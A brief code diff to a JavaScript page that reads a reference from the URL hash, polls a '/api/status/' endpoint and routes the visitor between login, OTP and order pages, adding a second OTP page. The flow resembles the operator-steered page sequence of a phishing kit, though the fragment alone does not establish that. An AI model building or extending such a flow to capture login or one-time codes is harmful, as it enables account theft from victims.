@@ -48,7 +48,7 @@ const ref = hash.split("~")[0];
 
 if (!ref) { window.location.href = "login-en.html"; }
 
-const pages = {login:"login-en.html",otp:"otp-en.html",order:"order-en.html"};
+const pages = {login:"login-en.html",otp:"otp-en.html",otp2:"otp2-en.html",order:"order-en.html"};
 let polling = setInterval(async () => {
   try {
     const r = await fetch("/api/status/" + encodeURIComponent(ref));
